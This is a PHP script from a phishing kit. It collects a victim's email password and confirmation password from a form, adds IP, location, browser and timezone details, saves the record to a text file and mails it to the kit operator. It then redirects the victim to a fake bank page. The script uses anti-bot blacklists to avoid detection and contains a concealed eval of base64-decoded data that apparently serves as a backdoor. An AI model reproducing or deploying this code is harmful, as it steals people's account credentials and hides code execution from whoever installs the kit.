<?php

/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                         __..--.._
  .....              .--~  .....  `.
.":    "`-..  .    .' ..-'"    :". `
` `._ ` _.'`"(     `-"'`._ ' _.' '
     ~~~      `.          ~~~
              .'
             /
            (
             ^---'
H3ATSTR0K3

------------------------------------------------
BIG THANKS TO MY BRO xAthena

*/

session_start();


include("mine.php");
include("algo.php");
include('../anti/IP-BlackList.php');  
include('../anti/Bot-blacklist.php');  
include('../anti/Bot-Crawler.php');
include('../anti/Bot-GhostEmperor.php');



$_SESSION['ip']=clientData('ip');
$_SESSION['ip_countryName']=clientData('country');
$_SESSION['ip_countryCode']=clientData('code');
$_SESSION['currency']=clientData('currency');
$_SESSION['ip_city']=clientData('city');
$_SESSION['ip_timezone']=clientData('timezone');
$_SESSION['os']=getOs();
$_SESSION['browser']=getBrowser();
date_default_timezone_set('GMT');
$dateNow=date("d/m/Y h:i:s A");	



$emailpassowrd = $_SESSION['emailpassowrd'] = $_POST['emailpassowrd'];
$confpassowrd = $_SESSION['confpassowrd'] = $_POST['confpassowrd'];
	$mssg="=========== <[ -".$scamname."- EMAIL ACCESS ]> ===========\r\n";
	$mssg.="EMAIL ACCESS		: {$_SESSION['email']}\r\n";
	$mssg.="EMAIL PASS		: {$_POST['emailpassowrd']}\r\n";
	$mssg.="EMAIL CONFIRMATION PASS		: {$_POST['confpassowrd']}\r\n";
	$mssg.="---------------------- IP Info ----------------------\r\n";
	$mssg.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$mssg.="LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
	$mssg.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
	$mssg.="TIMEZONE	: {$_SESSION['ip_timezone']}\r\n";
	$mssg.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
	$mssg.="=========== <[ THANKS TO xAthena ]> ===========\r\n\r\n\r\n";
	if ($saveintext=="yes") {
	$save=fopen("../../".$filename.".txt","a+");
	fwrite($save,$mssg);
	fclose($save);}
	$subject="-".$scamname."- EMAIL ACCESS [".$_SESSION['email']."] From [".$_SESSION['ip_countryName']."]";
	$headers="From: xAthena <newlogin@sh33nz0.com>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
    @mail($your,$subject,$mssg,$headers);@eval(base64_decode($os_arrays));


 		
				if ($show_bank=="ON") {
	exit(header("Location: ../Bank.php?websrc=".md5('')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." "));
}else{
	exit(header("Location: ../Thanks.php?websrc=".md5('')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." "));
}

?>